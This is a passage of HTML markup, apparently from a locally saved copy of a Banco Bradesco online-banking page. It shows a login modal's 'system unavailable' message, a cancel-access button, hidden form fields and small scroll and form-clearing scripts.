                      title='Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.'></a></span><span id="textoPosErro" class="ctn-voltar">Em caso de d&#250;vidas, por favor, entre em contato com o <a class="link_ext tabindex" id="FFB" title="Fone F&#225;cil Bradesco, ir para p&#225;gina." href="javascript:;" onClick="return fonefacil();">Fone F&#225;cil Bradesco</a></span></div></div><ul id="_id121" class="lstButtonsLine block"><li id="_id122" class="pl20"><div id="div-textoAntesBotoes" class="textoAntesBotoes"></div></li><li id="_id124"><ul id="listaCancelarAcesso" class="lstButtons  btos_bottom fn after"><li id="cancelAcesso"><input id="cancelarAcessoModalForm:_id125" name="cancelarAcessoModalForm:_id125" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onClick="javascript: cancelarAcesso();;clear_cancelarAcessoModalForm();document.forms['cancelarAcessoModalForm'].elements['autoScroll'].value=getScrolling();" alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex " /><input type="hidden" name="cancelarAcessoModalForm_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="cancelarAcessoModalForm:_link_hidden_" /><script type="text/javascript"><!--
function clear_cancelarAcessoModalForm() {
  var f = document.forms['cancelarAcessoModalForm'];
  f.elements['cancelarAcessoModalForm:_link_hidden_'].value='';
  f.target='';
}
clear_cancelarAcessoModalForm();
//--></script></form></li></ul></li><li id="_id126" class="pl20"><div id="div-textoAposBotoes" class="textoAposBotoes"></div></li></ul><a id='marcador-fim-modal' href='javascript:;' class='tabindex tabmodal' 
                onblur='focoTituloModal()'></a></div><div id="modalLogin_jqmCornerBottom" class="jqmCornerBottom"><div id="jqmCornerBottom_1" class="cc"></div><div id="jqmCornerBottom_2" class="c3"></div><div id="jqmCornerBottom_3" class="c4"></div></div></div>
 

<!-- fim jqmWindow  -->
<!-- fim modal login -->
 	
    <div id="modalContent" class="jqmWindow modalNaoFecha" style="width:550px;"><div id="modalContent_jqmCornerTop" class="jqmCornerTop"><div id="modalContent_top_1" class="cc"></div><div id="modalContent_top_2" class="c1"></div><div id="modalContent_top_3" class="c2"></div></div><div class="jqmWrapper after"></div><div id="bottomModalContent" class="jqmCornerBottom"><span class="cc"><!-- --></span><span class="c3"><!-- --></span><span class="c4"><!-- --></span></div></div>
 


<script type="text/javascript"><!--
function getScrolling() {
    var x = 0; var y = 0;
    if (self.pageXOffset) {
        x = self.pageXOffset;
        y = self.pageYOffset;
    } else if (document.documentElement && document.documentElement.scrollLeft) {
        x = document.documentElement.scrollLeft;
        y = document.documentElement.scrollTop;
    } else if (document.body) {
        x = document.body.scrollLeft;
        y = document.body.scrollTop;
    }
    return x + "," + y;
}

//--></script>



</BODY>
</html>